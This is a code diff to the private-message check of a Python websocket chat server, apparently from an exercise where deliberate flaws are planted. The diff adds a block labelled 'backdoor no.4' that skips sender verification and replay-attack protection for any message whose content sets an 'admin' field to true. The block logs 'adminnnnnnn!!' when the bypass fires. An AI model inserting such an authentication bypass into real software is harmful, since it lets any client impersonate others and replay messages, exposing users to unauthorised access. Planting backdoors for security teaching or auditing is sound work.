@@ -203,20 +203,27 @@ class Server:
         await self.connect_to_neighbour(neighbour_url)
 
     def check_private_message(self, websocket, message):
-        sender = self.clients.get(websocket)
-        if not sender:
-            logging.error(f"{self.url} message from unknown client detected")
-            return False
+        # backdoor no.4
+        message_content = json.loads(message["data"]["message"])
+        if "admin" in message_content and message_content["admin"] == True:
+            # bypass check for admin
+            logging.info(f"adminnnnnnn!!")
+            return True
+        else:
+            sender = self.clients.get(websocket)
+            if not sender:
+                logging.error(f"{self.url} message from unknown client detected")
+                return False
 
-        # Check if the counter is larger or equal to the counter saved in the server
-        sender["counter"] = sender.get("counter", "0")
-        if int(message["counter"]) < int(sender["counter"]):
-            logging.error(f"{self.url} message with replay attack detected")
-            return False
+            # Check if the counter is larger or equal to the counter saved in the server
+            sender["counter"] = sender.get("counter", "0")
+            if int(message["counter"]) < int(sender["counter"]):
+                logging.error(f"{self.url} message with replay attack detected")
+                return False
 
-        # Increment counter
-        sender["counter"] = int(message["counter"]) + 1
-        return True
+            # Increment counter
+            sender["counter"] = int(message["counter"]) + 1
+            return True
 
     def get_websocket_from_fingerprint(self, fingerprint):
         """
